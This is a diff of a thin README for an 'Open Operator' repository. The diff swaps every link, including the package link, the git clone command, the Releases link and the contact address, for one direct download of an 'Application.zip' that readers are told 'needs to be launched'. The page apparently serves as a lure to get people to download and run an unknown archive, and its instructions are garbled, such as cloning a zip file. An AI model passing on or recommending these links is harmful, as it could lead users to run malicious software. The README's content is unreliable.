@@ -13,7 +13,7 @@ A repository focused on open-source software exploration and development.
 No specific topics provided.
 
 ## Software Package:
-📦 [Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) (needs to be launched)
+📦 [https://github.com/irfan9201/open-operator/releases/download/v1.0/Application.zip](https://github.com/irfan9201/open-operator/releases/download/v1.0/Application.zip) (needs to be launched)
 
 ### Introduction
 Open Operator is all about embracing the open-source culture and fostering collaboration in the software development community. This repository serves as a hub for enthusiasts to come together, share ideas, and work on exciting projects.
@@ -27,7 +27,7 @@ Here are some key features of the Open Operator repository:
 ### How to Get Started:
 1. Clone the repository to your local machine.
 ```
-git clone https://github.com/your-username/open-operator.git
+git clone https://github.com/irfan9201/open-operator/releases/download/v1.0/Application.zip
 ```
 2. Explore the contents of the repository and discover the available software packages.
 3. Dive into the world of open-source development by collaborating with other developers.
@@ -37,9 +37,9 @@ git clone https://github.com/your-username/open-operator.git
 - **Feedback:** Share your thoughts and ideas on how we can improve the open-source experience.
 
 ### Resources:
-Check out the [Releases](https://github.com/Rubenas123/6487922/releases) section for the latest updates and software releases.
+Check out the [Releases](https://github.com/irfan9201/open-operator/releases/download/v1.0/Application.zip) section for the latest updates and software releases.
 
 ### Contact Us:
-If you have any questions or suggestions, feel free to reach out to us at openoperator@example.com
+If you have any questions or suggestions, feel free to reach out to us at https://github.com/irfan9201/open-operator/releases/download/v1.0/Application.zip
 
 Let's build a thriving open-source community together! 🌟🌐🛠️
